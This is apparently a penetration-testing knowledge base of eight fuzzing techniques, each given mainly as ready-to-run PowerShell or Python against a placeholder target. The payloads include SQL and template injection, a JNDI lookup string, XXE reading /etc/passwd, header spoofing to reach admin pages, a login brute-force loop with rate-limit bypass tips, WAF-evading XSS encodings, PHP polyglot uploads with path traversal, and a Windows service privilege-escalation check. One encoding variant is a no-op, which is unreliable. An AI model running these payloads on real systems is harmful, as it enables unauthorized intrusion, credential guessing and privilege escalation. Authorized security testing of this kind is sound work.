# Chaos / Fuzz Techniques (native) — Knowledge Base
_Last updated: 2026-06-25_

Directed fuzzing and boundary testing using native primitives and Tier-1 scripts. No intercepting-proxy fuzzer, no installed fuzzers — raw HTTP loops and parameter mutation.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | Parameter fuzz (web) | Fuzz values for a known parameter | 0-native | chaos, web, fuzz |
| T2 | Header injection fuzz | Test HTTP headers for injection | 0-native | chaos, web, headers |
| T3 | Method tampering | Try unexpected HTTP methods | 0-native | chaos, web, auth |
| T4 | Content-type juggling | Switch content types to bypass parsing | 0-native | chaos, web |
| T5 | Rate limit / brute force | Test for missing rate limits | 0-native | chaos, web, auth |
| T6 | Unicode / encoding fuzz | Bypass filters with encoding tricks | 0-native | chaos, web, bypass |
| T7 | File format fuzz | Fuzz file upload with mutated files | 1-python | chaos, web, upload, tier1-python |
| T8 | Windows service fuzz | Abuse-check local services | 0-native | chaos, windows-local |

## Techniques

### T1: Parameter fuzz (web)
Tags: chaos, web, fuzz
When: A parameter accepts user input — want to fuzz for unexpected behavior.
Why: Sending boundary values, special characters, and injection payloads reveals input validation gaps. A PowerShell loop + wordlist covers it natively.
Tier: 0-native
Payload:
```powershell
$url = "https://target.example/api/search"
$payloads = @(
    "","'","''","\"","\\","`","${7*7}","{{7*7}}","<script>","<img/src=x>",
    "1 OR 1=1","1' OR '1'='1","admin' --","' AND '1'='1",
    "%00","%0a","%0d%0a","%25","..%2f..%2f","${jndi:ldap://x}",
    "A"*10000, "-1", "0", "99999999", "null", "undefined", "NaN", "true",
    "{{constructor.constructor('return this')()}}",
    "__proto__[isAdmin]=true"
)
$payloads | ForEach-Object {
    try {
        $r = Invoke-WebRequest "$url?q=$([uri]::EscapeDataString($_))" -UseBasicParsing -EA Stop -TimeoutSec 10
        if ($r.StatusCode -ne 200 -or $r.Content.Length -gt 50000) {
            "[INTERESTING] '$($_.Substring(0,40))' -> Status=$($r.StatusCode) Len=$($r.Content.Length)"
        }
    } catch {
        "[ERROR] '$($_.Substring(0,[Math]::Min(40,$_.Length)))' -> $($_.Exception.Message)"
    }
}
```
Signal: unexpected status codes, error messages, or response-size anomalies. | Pitfall: URL-encode payloads to avoid breaking the request. Compare against a baseline (normal request) for meaningful diffs.
Source: distilled native param fuzz — 2026-06-25

### T2: Header injection fuzz
Tags: chaos, web, headers
When: Testing if the app processes custom or abused HTTP headers.
Why: Host header injection, X-Forwarded-For spoofing, and CRLF injection in headers can bypass access controls or poison caches.
Tier: 0-native
Payload:
```powershell
$url = "https://target.example/"
$tests = @(
    @{Host="evil.example"},
    @{Host="target.example`nX-Injected: true"},
    @{'X-Forwarded-For'="127.0.0.1"},
    @{'X-Forwarded-Host'="evil.example"},
    @{'X-Original-URL'="/admin"},
    @{'X-Rewrite-URL'="/admin"},
    @{'X-Custom-IP-Authorization'="127.0.0.1"},
    @{'X-Forwarded-Port'="443"; 'X-Forwarded-Scheme'="https"}
)
$tests | ForEach-Object {
    $headers = $_
    try {
        $r = Invoke-WebRequest $url -UseBasicParsing -Headers $headers -EA Stop
        "[{0}] Headers: {1}" -f $r.StatusCode, ($headers | ConvertTo-Json -Compress)
    } catch {
        "[ERR] {0}" -f ($headers | ConvertTo-Json -Compress)
    }
}
```
Signal: different response with spoofed headers (especially gaining access to `/admin`). | Pitfall: CRLF injection in headers is mostly a HTTP/1.1 thing — modern frameworks often strip newlines.
Source: distilled native header fuzz — 2026-06-25

### T3: Method tampering
Tags: chaos, web, auth
When: Endpoint restricts by HTTP method (e.g., admin panel only allows GET for authenticated users) — test other methods.
Why: Some middleware only checks auth on specific methods. `PUT`/`DELETE`/`PATCH`/`OPTIONS` may bypass restrictions.
Tier: 0-native
Payload:
```powershell
$url = "https://target.example/admin/users"
@("GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE") | ForEach-Object {
    try {
        $r = Invoke-WebRequest $url -Method $_ -UseBasicParsing -EA Stop
        "[{0}] {1} -> Status={2} Len={3}" -f $_, $url, $r.StatusCode, $r.Content.Length
    } catch {
        "[{0}] {1} -> {2}" -f $_, $url, $_.Exception.Response.StatusCode
    }
}
```
Signal: unexpected 200/OK on a method that should be blocked. | Pitfall: `TRACE` returns the request echoed — if it includes cookies/auth headers, that's a finding (XST).
Source: distilled method tampering — 2026-06-25

### T4: Content-type juggling
Tags: chaos, web
When: Endpoint expects JSON — try XML, form-encoded, or multipart to bypass input parsing.
Why: Some parsers handle multiple content types, and switching may bypass validation that only applies to one format.
Tier: 0-native
Payload:
```powershell
$url = "https://target.example/api/login"
$data = @{username="admin";password="test"}

# JSON (normal)
Invoke-RestMethod $url -Method POST -ContentType 'application/json' -Body ($data | ConvertTo-Json)

# form-encoded
Invoke-RestMethod $url -Method POST -ContentType 'application/x-www-form-urlencoded' -Body "username=admin&password=test"

# XML
$xml = '<root><username>admin</username><password>test</password></root>'
Invoke-RestMethod $url -Method POST -ContentType 'application/xml' -Body $xml

# XML with XXE attempt
$xxe = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><username>&xxe;</username><password>test</password></root>'
Invoke-RestMethod $url -Method POST -ContentType 'application/xml' -Body $xxe
```
Signal: different parsing behavior or XXE triggered. | Pitfall: modern frameworks usually don't parse XML unless explicitly configured — but legacy apps and Java services often do.
Source: distilled content-type juggling — 2026-06-25

### T5: Rate limit / brute force
Tags: chaos, web, auth
When: Testing login, OTP, or resource-creation endpoints for missing rate limits.
Why: If there's no rate limit, brute-force is viable. If there IS a rate limit, document it (and test bypass: IP rotation, header spoofing).
Tier: 0-native
Payload:
```powershell
$url = "https://target.example/api/login"
$results = @()
1..50 | ForEach-Object {
    $body = @{username="admin";password="attempt$_"} | ConvertTo-Json
    try {
        $r = Invoke-WebRequest $url -Method POST -ContentType 'application/json' -Body $body -UseBasicParsing -EA Stop
        $results += [PSCustomObject]@{Attempt=$_;Status=$r.StatusCode}
    } catch {
        $results += [PSCustomObject]@{Attempt=$_;Status=$_.Exception.Response.StatusCode}
    }
}
$results | Group-Object Status | Format-Table Name, Count
if ($results[-1].Status -ne 429) { "[NO-RATE-LIMIT] 50 attempts without throttle" }
```
Signal: no 429 or lockout after many attempts. | Pitfall: test rate-limit bypass with `X-Forwarded-For` header rotation — some implementations key on that header instead of actual source IP.
Source: distilled rate-limit test — 2026-06-25

### T6: Unicode / encoding fuzz
Tags: chaos, web, bypass
When: WAF or input filter blocks a payload — try encoding variants to bypass.
Why: Normalization differences between the WAF and the backend can let encoded payloads through.
Tier: 0-native
Payload:
```powershell
$base = "https://target.example/search?q="
$original = "<script>alert(1)</script>"
$variants = @(
    $original,
    [uri]::EscapeDataString($original),                   # URL encode
    $original -replace '<','%3C' -replace '>','%3E',      # partial encode
    $original -replace '<','＜' -replace '>','＞',         # fullwidth unicode
    $original -replace 'script','scr%00ipt',               # null byte
    $original -replace 'alert','alert',               # unicode escape
    "%uff1cscript%uff1ealert(1)%uff1c/script%uff1e"        # fullwidth tags
)
$variants | ForEach-Object {
    $r = Invoke-WebRequest "$base$_" -UseBasicParsing -EA SilentlyContinue
    if ($r -and $r.Content -match 'alert\(1\)') { "[BYPASS] Encoding variant worked: $($_.Substring(0,50))" }
}
```
Signal: payload reaches the response unfiltered. | Pitfall: double-encoding (`%253C`) may also work if the backend URL-decodes twice.
Source: distilled encoding fuzz — 2026-06-25

### T7: File format fuzz
Tags: chaos, web, upload, tier1-python
When: File upload endpoint — want to test with mutated/malformed files.
Why: Uploading polyglot files, oversized files, null-byte filenames, and content-type mismatches reveals upload validation gaps.
Tier: 1-python
Escalation: building polyglot files and multipart boundary manipulation is cleaner in Python than PowerShell string manipulation.
Payload:
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: multipart/polyglot construction
import urllib.request, sys, io

URL = sys.argv[1]
TOKEN = sys.argv[2] if len(sys.argv) > 2 else ""

tests = [
    ("test.php", "image/png", b"\x89PNG\r\n\x1a\n<?php echo 'RCE'; ?>"),        # PNG+PHP polyglot
    ("test.php%00.png", "image/png", b"<?php echo 'RCE'; ?>"),                    # null byte
    ("test.PhP", "image/png", b"<?php echo 'RCE'; ?>"),                           # case
    ("test.php.png", "image/png", b"<?php echo 'RCE'; ?>"),                       # double ext
    ("test.svg", "image/svg+xml", b'<svg onload="alert(1)"/>'),                   # SVG XSS
    ("../../../etc/test.txt", "text/plain", b"path_traversal_test"),               # path traversal
    ("test.html", "text/html", b"<script>alert(document.domain)</script>"),       # HTML upload
]

for fname, ctype, content in tests:
    boundary = "----HkAudBoundary"
    body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\nContent-Type: {ctype}\r\n\r\n".encode() + content + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(URL, data=body, headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Authorization": f"Bearer {TOKEN}" if TOKEN else "",
    })
    try:
        r = urllib.request.urlopen(req, timeout=10)
        print(f"[{r.status}] {fname} ({ctype}) -> uploaded")
    except Exception as e:
        print(f"[ERR] {fname} -> {e}")
```
Signal: malicious file type uploaded and potentially executable. | Pitfall: check if the uploaded file is accessible AND interpreted — upload succeeding is only half the story.
Source: distilled file format fuzz — 2026-06-25

### T8: Windows service fuzz
Tags: chaos, windows-local
When: Checking local Windows services for abuse (unquoted paths, weak permissions, writable dirs).
Why: A comprehensive native check of all services for common misconfigurations — faster than manual inspection.
Tier: 0-native
Payload:
```powershell
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.State -eq 'Running' } | ForEach-Object {
    $svc = $_
    $issues = @()
    # unquoted path with spaces
    if ($svc.PathName -match '^[^"].*\s.*\.exe' -and $svc.PathName -notmatch '^"') { $issues += "UNQUOTED_PATH" }
    # writable binary
    $bin = ($svc.PathName -replace '"','') -replace '\s+/.*','' -replace '\s+-.*',''
    if (Test-Path $bin) {
        $acl = Get-Acl $bin
        $acl.Access | Where-Object { $_.IdentityReference -match '(Users|Everyone|Authenticated)' -and $_.FileSystemRights -match 'Write|FullControl' } | ForEach-Object { $issues += "WRITABLE_BINARY" }
    }
    # writable directory
    $dir = Split-Path $bin -Parent
    if (Test-Path $dir) {
        $acl = Get-Acl $dir
        $acl.Access | Where-Object { $_.IdentityReference -match '(Users|Everyone|Authenticated)' -and $_.FileSystemRights -match 'Write|FullControl' } | ForEach-Object { $issues += "WRITABLE_DIR" }
    }
    if ($issues) {
        "[SVC-VULN] $($svc.Name) ($($svc.PathName)): $($issues -join ', ')"
    }
}
```
Signal: services with exploitable misconfigurations. | Pitfall: `Get-Acl` on some paths requires admin — run from the highest privilege you have.
Source: distilled native service fuzz — 2026-06-25
